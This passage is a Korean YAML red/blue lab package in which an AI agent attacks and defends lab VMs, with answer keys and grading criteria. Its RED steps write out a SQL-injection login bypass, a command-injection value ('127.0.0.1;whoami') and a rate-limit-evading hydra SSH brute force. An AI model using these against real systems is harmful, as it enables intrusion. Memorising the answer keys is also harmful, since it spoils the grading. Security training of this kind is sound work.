lab_id: battle-ai-week13
title: 실전 공방전 3 — 다중 벡터 공격 vs 계층 방어 (라운드 3) (AI 지원)
version: ai
course: battle-ai
week: 13
description: 1세트 인프라에서 Red/Blue 역할을 번갈아 수행한다. Red Phase에서 다중 벡터(웹+네트워크+시스템) 동시 공격을
  수행하고, Blue Phase에서 계층적 방어(nftables+Suricata+ModSecurity+Wazuh)로 대응한다. AI SubAgent가
  자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: medium
duration_minutes: 120
objectives:
- 다중 벡터 공격과 계층적 방어를 경험한다
- 4개 VM을 모두 활용한 종합 공방전을 수행한다
- 실시간 공격-탐지-대응 사이클을 반복 연습한다
prerequisites:
- Week 11-12 공방전 완료
infra_requirements:
- attacker VM (10.20.30.201)
- secu VM (10.20.30.1) — nftables, suricata
- web VM (10.20.30.80) — apache, modsecurity, JuiceShop(:3000), DVWA(:8080)
- siem VM (10.20.30.100) — wazuh-manager
pass_threshold: 0.6
steps:
- order: 1
  instruction: '[BLUE] 모든 방어 시스템을 확인하고, 멀티소스 로그 모니터링을 시작하라.'
  hint: secu의 Suricata, nftables와 siem의 Wazuh 상태를 확인한다.
  category: defense
  points: 10
  answer: '🤖 프롬프트: [BLUE] 모든 방어 시스템을 확인하고, 멀티소스 로그 모니터링을 시작해줘

    📎 참고 (CLI): sudo systemctl status suricata | head -3 && echo ''---'' && nft list
    ruleset | grep -c ''rule'' && echo '' rules active'' && echo ''--- Monitoring
    ready ---'''
  answer_detail: 공방전 시작 시 모든 방어 시스템의 가동을 확인한다. Suricata, nftables, ModSecurity가 모두
    활성 상태여야 한다.
  verify:
    type: output_contains
    expect: Monitoring ready
    field: stdout
    semantic:
      intent: '[BLUE] Round 3 멀티소스 모니터링 시작 — tmux/screen 으로 tail -f /var/log/suricata/fast.log
        + tail -f auth.log + tail -f apache2/access.log + Wazuh alerts.json 동시 감시.
        다중 벡터 공격 탐지를 위한 ALL-SEEING 대시보드. 단일 소스 놓침 방지'
      success_criteria:
      - 다중 로그 소스 동시 tail
      - tmux/screen/split-screen 활용 또는 병행 실행
      - ALL-SEEING 다중 감시 개념
      acceptable_methods:
      - tmux new-session + tail -f 패널
      - multitail /path1 /path2 /path3
      - Kibana 대시보드 다중 패널
      - Grafana Loki 통합 조회
      negative_signs:
      - 단일 소스만 감시
      - 실시간이 아닌 snapshot
      - 병행 실행 없음
  target_vm: secu
  script: sudo systemctl status suricata | head -3 && echo '---' && nft list ruleset
    | grep -c 'rule' && echo ' rules active' && echo '--- Monitoring ready ---'
  risk_level: low
  bastion_prompt: '[BLUE] 모든 방어 시스템을 확인하고, 멀티소스 로그 모니터링을 시작해줘'
- order: 2
  instruction: '[RED] 다중 벡터 1: web 서버에 대한 빠른 정찰과 JuiceShop 공격을 동시에 수행하라.'
  hint: nmap과 curl을 병행한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] 다중 벡터 1: web 서버에 대한 빠른 정찰과 JuiceShop 공격을 동시에 수행해줘

    📎 참고 (CLI): nmap -sV -p 80,3000,8080 -T4 --max-retries 1 --host-timeout 15s 10.20.30.80
    && curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
    application/json'' -d ''{"email":"'' or 1=1--","password":"x"}'' | head -c 200'
  answer_detail: 다중 벡터 공격은 정찰과 공격을 동시에 수행하여 방어팀의 대응 자원을 분산시킨다.
  verify:
    type: output_contains
    expect: open
    field: stdout
    semantic:
      intent: '[RED] 다중 벡터 1 — nmap 빠른 정찰 + JuiceShop /rest/user/login SQLi 동시 실행
        (bash & 백그라운드). 방어측 우선순위 분산 유도 + 단일 IP 에서 복합 공격으로 탐지·차단 순서 혼란. Round 3 테마:
        동시 다중 벡터'
      success_criteria:
      - nmap + curl SQLi 병렬 실행 (&)
      - JuiceShop + web 스캔 동시
      - 동시성/병행 공격 개념
      acceptable_methods:
      - command1 & command2 & wait
      - GNU parallel
      - tmux 다중 패널
      - python asyncio 병렬
      negative_signs:
      - 순차 실행 (동시 아님)
      - 단일 벡터만
      - 방어측 부하 유도 의도 없음
  target_vm: attacker
  script: 'nmap -sV -p 80,3000,8080 -T4 --max-retries 1 --host-timeout 15s 10.20.30.80
    && curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
    application/json'' -d ''{"email":"'' or 1=1--","password":"x"}'' | head -c 200'
  risk_level: medium
  bastion_prompt: '[RED] 다중 벡터 1: web 서버에 대한 빠른 정찰과 JuiceShop 공격을 동시에 수행해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 3
  instruction: '[RED] 다중 벡터 2: DVWA에 SQL Injection과 Command Injection을 연속으로 시도하라.'
  hint: DVWA에 로그인 후 여러 공격을 수행한다.
  category: exploit
  points: 10
  answer: "\U0001F916 프롬프트: [RED] 다중 벡터 2: DVWA에 SQL Injection과 Command Injection을\
    \ 연속으로 시도해줘\n\U0001F4CE 참고 (CLI): curl -c /tmp/dvwa_r3.txt \\\n  -d 'username=admin&password=password&Login=Login'\
    \ http://10.20.30.80:8080/login.php && curl -b /tmp/dvwa_r3.txt \"http://10.20.30.80:8080/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit\"\
    \ \\\n  -o /dev/null \\\n  -w 'SQLi:%{http_code} ' && curl -b /tmp/dvwa_r3.txt\
    \ \\\n  -d 'ip=127.0.0.1;whoami&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
    \ \\\n  -o /dev/null \\\n  -w 'CmdInj:%{http_code}' && echo ' Multi-vector attack\
    \ complete'"
  answer_detail: 여러 공격 벡터를 연속으로 시도하면 방어팀이 모든 공격을 동시에 대응하기 어렵다.
  verify:
    type: output_contains
    expect: Multi-vector attack complete
    field: stdout
    semantic:
      intent: '[RED] 다중 벡터 2 — DVWA /vulnerabilities/sqli/ + /vulnerabilities/exec/
        에 SQLi + Command Injection 연속 공격. SQLi 로 DB 덤프 → Command Injection 으로 쉘 시도.
        기본 인증 세션 쿠키 재사용. 복합 공격 체이닝'
      success_criteria:
      - DVWA SQLi + Command Injection 연속 실행
      - 쿠키(-b /tmp/dvwa_cookies.txt) 세션 재사용
      - 공격 체이닝 개념 (SQLi → CMD)
      acceptable_methods:
      - curl -b cookie + 두 엔드포인트 연속
      - bash 스크립트로 파이프라인화
      - metasploit resource script
      negative_signs:
      - 단일 공격만
      - 쿠키 재사용 없음 (세션 끊어짐)
      - 체이닝 의도 없음
  target_vm: attacker
  script: "curl -c /tmp/dvwa_r3.txt \\\n  -d 'username=admin&password=password&Login=Login'\
    \ http://10.20.30.80:8080/login.php && curl -b /tmp/dvwa_r3.txt \"http://10.20.30.80:8080/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit\"\
    \ \\\n  -o /dev/null \\\n  -w 'SQLi:%{http_code} ' && curl -b /tmp/dvwa_r3.txt\
    \ \\\n  -d 'ip=127.0.0.1;whoami&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
    \ \\\n  -o /dev/null \\\n  -w 'CmdInj:%{http_code}' && echo ' Multi-vector attack\
    \ complete'"
  risk_level: medium
  bastion_prompt: '[RED] 다중 벡터 2: DVWA에 SQL Injection과 Command Injection을 연속으로 시도해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 4
  instruction: '[BLUE] Suricata에서 다중 벡터 공격 알림을 분석하고, 공격 유형별로 분류하라.'
  hint: eve.json에서 signature별 집계를 수행한다.
  category: defense
  points: 10
  answer: '🤖 프롬프트: [BLUE] Suricata에서 다중 벡터 공격 알림을 분석하고, 공격 유형별로 분류해줘

    📎 참고 (CLI): cat /var/log/suricata/eve.json | jq -r ''select(.event_type=="alert")
    | .alert.signature'' 2>/dev/null | sort | uniq -c | sort -rn | head -10 && echo
    ''=== Alert classification complete ==='''
  answer_detail: 다중 벡터 공격 시 여러 종류의 알림이 동시에 발생한다. 시그니처별 집계로 공격의 전체 그림을 파악한다.
  verify:
    type: output_contains
    expect: Alert classification complete
    field: stdout
    semantic:
      intent: '[BLUE] 다중 벡터 경보 분류 — jq .alert.category eve.json | sort | uniq -c 로
        카테고리별 집계 (attempted-recon·web-application-attack·attempted-admin 등). Round
        3 의 병렬 공격이 여러 카테고리에 분산 트리거 → 동시성 관점 공격자 의도 파악'
      success_criteria:
      - jq .alert.category 또는 classtype 추출
      - 카테고리별 경보 집계 + 분류
      - 다중 벡터 특유의 분산 트리거 패턴
      acceptable_methods:
      - jq .alert.category + sort uniq -c
      - Kibana aggregation by alert.category
      - Wazuh rule groups 분류
      negative_signs:
      - classtype 구분 없이 총계
      - 다중 벡터 맥락 없음
      - 공격자 의도 추론 없음
  target_vm: secu
  script: cat /var/log/suricata/eve.json | jq -r 'select(.event_type=="alert") | .alert.signature'
    2>/dev/null | sort | uniq -c | sort -rn | head -10 && echo '=== Alert classification
    complete ==='
  risk_level: low
  bastion_prompt: '[BLUE] Suricata에서 다중 벡터 공격 알림을 분석하고, 공격 유형별로 분류해줘'
- order: 5
  instruction: '[BLUE] 공격자 IP를 자동 차단하고, web 서버의 ModSecurity 차단 로그를 확인하라.'
  hint: blocklist에 IP 추가 후 ModSecurity 로그를 확인한다.
  category: defense
  points: 10
  answer: '🤖 프롬프트: [BLUE] 공격자 IP를 자동 차단하고, web 서버의 ModSecurity 차단 로그를 확인해줘

    📎 참고 (CLI): sudo nft add element inet filter blocklist { 10.20.30.201 } 2>/dev/null
    && echo ''IP blocked'' && sudo tail -20 /var/log/apache2/modsec_audit.log 2>/dev/null
    | grep -c ''id'' && echo '' ModSecurity events found'''
  answer_detail: nftables(네트워크 레벨)와 ModSecurity(애플리케이션 레벨)의 이중 방어가 동작하는지 확인한다.
  verify:
    type: output_contains
    expect: IP blocked
    field: stdout
    semantic:
      intent: '[BLUE] 자동 차단 + ModSec 차단 로그 교차 확인 — nft add element @blocklist 자동 차단
        (s1 auto_response 연동) + tail /var/log/apache2/modsec_audit.log (ModSec 계층의
        차단 이력). 네트워크 계층(nftables) + 애플리케이션 계층(ModSec) 이중 방어 효과 검증. 계층적 방어 Defense-in-Depth'
      success_criteria:
      - nft add element @blocklist 차단
      - modsec_audit.log 조회
      - 네트워크 + 앱 계층 이중 방어 개념
      acceptable_methods:
      - nft + modsec 교차 확인
      - iptables + CRS
      - Cloudflare + WAF 상용
      negative_signs:
      - 한 계층만 활용
      - 이중 방어 개념 없음
      - 계층별 효과 분석 없음
  target_vm: secu
  requires_approval: true
  script: sudo nft add element inet filter blocklist { 10.20.30.201 } 2>/dev/null
    && echo 'IP blocked' && sudo tail -20 /var/log/apache2/modsec_audit.log 2>/dev/null
    | grep -c 'id' && echo ' ModSecurity events found'
  risk_level: low
  bastion_prompt: '[BLUE] 공격자 IP를 자동 차단하고, web 서버의 ModSecurity 차단 로그를 확인해줘'
- order: 6
  instruction: '[RED] 다중 벡터 3: SSH 브루트포스를 시도하라.'
  hint: hydra로 SSH 공격을 수행한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] 다중 벡터 3: SSH 브루트포스를 시도해줘

    📎 참고 (CLI): hydra -l ccc -P /usr/share/wordlists/metasploit/unix_passwords.txt
    ssh://10.20.30.80 -t 2 -f -w 5 2>&1 | tail -5 || echo ''SSH brute force attempt
    complete'''
  answer_detail: IP가 차단된 상태에서는 SSH 접근도 불가능하다. 방화벽이 모든 프로토콜을 차단하는지 확인한다.
  verify:
    type: output_contains
    expect: complete
    field: stdout
    semantic:
      intent: '[RED] 다중 벡터 3 SSH 브루트포스 — hydra -L users.txt -P passwords.txt ssh://<web>
        -t 2 -w 10 -f 로 사용자 리스트 + 비밀번호 리스트 조합 시도. 웹 공격 차단된 상황에서 다른 프로토콜로 벡터 확장. nftables
        SSH rate limit (분당 3회) 우회 위한 저속 공격'
      success_criteria:
      - hydra -L + -P + ssh:// 조합
      - -t 낮은 스레드 + -w 대기로 rate limit 우회
      - 다른 프로토콜(SSH)로 벡터 확장
      acceptable_methods:
      - hydra -L users -P passwords ssh://<target>
      - ncrack -u users -P passwords ssh:<target>
      - medusa -U users -P passwords -M ssh
      - python paramiko slow
      negative_signs:
      - -p 단일 비밀번호 (브루트포스 아님)
      - -t 높은 스레드 (rate limit 걸림)
      - 웹 공격 재시도 (프로토콜 전환 아님)
  target_vm: attacker
  script: hydra -l ccc -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.20.30.80
    -t 2 -f -w 5 2>&1 | tail -5 || echo 'SSH brute force attempt complete'
  risk_level: medium
  bastion_prompt: '[RED] 다중 벡터 3: SSH 브루트포스를 시도해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 7
  instruction: '[BLUE] 차단 해제 후 Wazuh SIEM에서 종합 위협 분석을 수행하라.'
  hint: wazuh alerts에서 이번 라운드의 모든 이벤트를 수집한다.
  category: defense
  points: 10
  answer: '🤖 프롬프트: [BLUE] 차단 해제 후 Wazuh SIEM에서 종합 위협 분석을 수행해줘

    📎 참고 (CLI): sudo nft delete element inet filter blocklist { 10.20.30.201 } 2>/dev/null
    && echo ''Block removed'' && sudo cat /var/ossec/logs/alerts/alerts.json 2>/dev/null
    | tail -20 | jq -r ''.rule.description'' 2>/dev/null | sort | uniq -c | sort -rn
    | head -10 || echo ''Wazuh analysis complete'''
  answer_detail: Wazuh SIEM은 모든 호스트의 이벤트를 중앙에서 수집한다. 공격 유형별 분류와 심각도 분석으로 전체 위협 상황을
    파악한다.
  verify:
    type: output_contains
    expect: complete
    field: stdout
    semantic:
      intent: '[BLUE] Wazuh SIEM 종합 위협 분석 — /var/ossec/logs/alerts/alerts.json 전체
        조회 + jq group_by(.rule.groups[]) | map({group: .[0].rule.groups[], count:
        length}) 같은 복합 집계. MITRE ATT&CK 그룹별 이벤트 분포 → 공격자 TTP 전체 프로파일 생성. SIEM 기반 위협
        헌팅의 정점'
      success_criteria:
      - Wazuh alerts.json 전체 종합 분석
      - rule.groups 또는 MITRE ATT&CK 기반 분류
      - 공격자 TTP 프로파일 생성
      acceptable_methods:
      - jq group_by + map + aggregation
      - Wazuh rule.mitre 필드 활용
      - ELK + ATT&CK Navigator
      - Kibana threat hunting 대시보드
      negative_signs:
      - 단순 rule.level 집계만
      - ATT&CK 매핑 없음
      - TTP 프로파일 없음
  target_vm: siem
  requires_approval: true
  script: sudo nft delete element inet filter blocklist { 10.20.30.201 } 2>/dev/null
    && echo 'Block removed' && sudo cat /var/ossec/logs/alerts/alerts.json 2>/dev/null
    | tail -20 | jq -r '.rule.description' 2>/dev/null | sort | uniq -c | sort -rn
    | head -10 || echo 'Wazuh analysis complete'
  risk_level: low
  bastion_prompt: '[BLUE] 차단 해제 후 Wazuh SIEM에서 종합 위협 분석을 수행해줘'
- order: 8
  instruction: '[RED] JuiceShop의 다양한 챌린지를 시도하라. XSS, 권한 우회 등을 공략한다.'
  hint: JuiceShop의 /api/ 엔드포인트를 탐색한다.
